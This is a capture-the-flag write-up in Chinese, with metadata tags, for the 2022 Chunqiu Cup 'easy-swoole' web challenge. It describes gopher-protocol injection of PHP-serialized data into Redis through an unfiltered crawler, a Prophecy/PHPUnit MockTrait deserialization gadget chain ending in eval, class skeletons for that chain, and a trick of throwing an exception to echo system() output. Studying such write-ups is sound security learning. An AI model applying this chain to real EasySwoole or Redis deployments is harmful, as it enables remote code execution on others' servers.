---
title: 【WP】2022年春秋杯春季赛 Web 类题目解析
contest: 春秋杯
year: 2022
difficulty: medium
vuln_type: deserialize
tags: [Swoole, EasySwoole, gopher-protocol, Redis-SERIALIZE_PHP, UploadFile-destruct, Prophecy-chain, PHPUnit-MockObject-MockTrait-generate-eval, swoole-RCE]
attack_chain: 1. Redis SERIALIZE_PHP 配置 + 爬虫 curl gopher 注入序列化数据 /2. UploadFile.__destruct → $this->stream->close 触发 __call/3. Prophecy ObjectProphecy 链 + LazyDouble + Doubler + PHPUnitFrameworkMockObjectMockTrait generate → eval RCE/4. Swoole 框架 system 无回显 → 抛异常回显
key_payload: EasySwooleHttpMessageUploadFile → ProphecyProphecyObjectProphecy → ProphecyDoublerLazyDouble → PHPUnitFrameworkMockObjectMockTrait generate → eval
one_liner: 2022 春秋杯春季赛 Web 2 题 WP，EasySwoole + Redis 反序列化 + gopher 注入 + PHPUnit Mock 链 RCE。
lesson: EasySwoole 默认 SERIALIZE_PHP 配置可被 gopher 注入利用；Swoole framework system() 无回显需用异常方式；Prophecy + PHPUnit MockObject 是 PHP 反序列化常见 gadget 库。
quality: high
---

# 【WP】2022年春秋杯春季赛 Web 类题目解析

## 概览
2022 春秋杯春季赛 Web 2 题 WP：easy-swoole + 1 道。

## easy-swoole

### 漏洞点
- Redis 配置 `SERIALIZE_PHP` 存储序列化数据
- 爬虫代码 `make_request` 用 `curl` 调任意 URL，无协议过滤
- 可通过 gopher 协议向 redis 注入序列化 payload
- 程序读取缓存时反序列化触发 RCE

### Redis 配置
```php
class Redis extends EasySwooleRedisRedis {
    public function __construct() {
        parent::__construct(new EasySwooleRedisConfigRedisConfig([
            'host' => 'redis',
            'port' => '6379',
            'auth' => '123456',
            'serialize' => EasySwooleRedisConfigRedisConfig::SERIALIZE_PHP
        ]));
    }
}
```

### POP 链
```php
namespace EasySwooleHttpMessage {
    class UploadFile {
        public $stream;
        function __construct($stream) {
            $this->stream = $stream;
        }
    }
}

namespace ProphecyProphecy {
    class ObjectProphecy {
        public $lazyDouble;
        public $revealer;
        function __construct($lazyDouble) {
            $this->revealer = $this;
            $this->lazyDouble = $lazyDouble;
        }
    }
}

namespace ProphecyDoubler {
    class LazyDouble {
        public $doubler;
        public $argument;
        public $class;
        public $interfaces;
        function __construct($doubler) {
            $this->doubler = $doubler;
            $this->class = null;
            $this->argument = [];
            $this->interfaces = [];
        }
    }
    class Doubler {
        public $mirror;
        public $creator;
        public $namer;
    }
}
```

### 攻击链
1. `UploadFile.__destruct` → `$this->stream->close()` 触发 `__call`
2. `Prophecy\Prophecy\ObjectProphecy.__call` → `revealer->reveal`
3. `Prophecy\Doubler\LazyDouble` + `Doubler`
4. `PHPUnit\Framework\MockObject\MockTrait` `generate` → `eval` RCE

### Swoole 输出技巧
- Swoole framework `system()` 无回显（不像 fastcgi）
- 用抛异常方式回显：`throw new Exception(system('id'));`

## 经验提炼
- EasySwoole 默认 SERIALIZE_PHP 配置可被 gopher 注入利用
- Swoole framework `system()` 无回显需用异常方式
- Prophecy + PHPUnit MockObject 是 PHP 反序列化常见 gadget 库
- `__destruct` → `__call` 是 PHP 反序列化链核心触发模式
- gopher 协议可向任意 TCP 服务发包（Redis/Memcached/MySQL 等）
- PHPUnit `MockTrait::generate` 是 eval gadget
- 爬虫类题目检查 `make_request` 是否过滤协议
- Redis `SERIALIZE_PHP` 比 `SERIALIZE_NONE` 危险

## 其他 Web 题
- 题目2: 标准 PHP 反序列化链
- 详细见原文
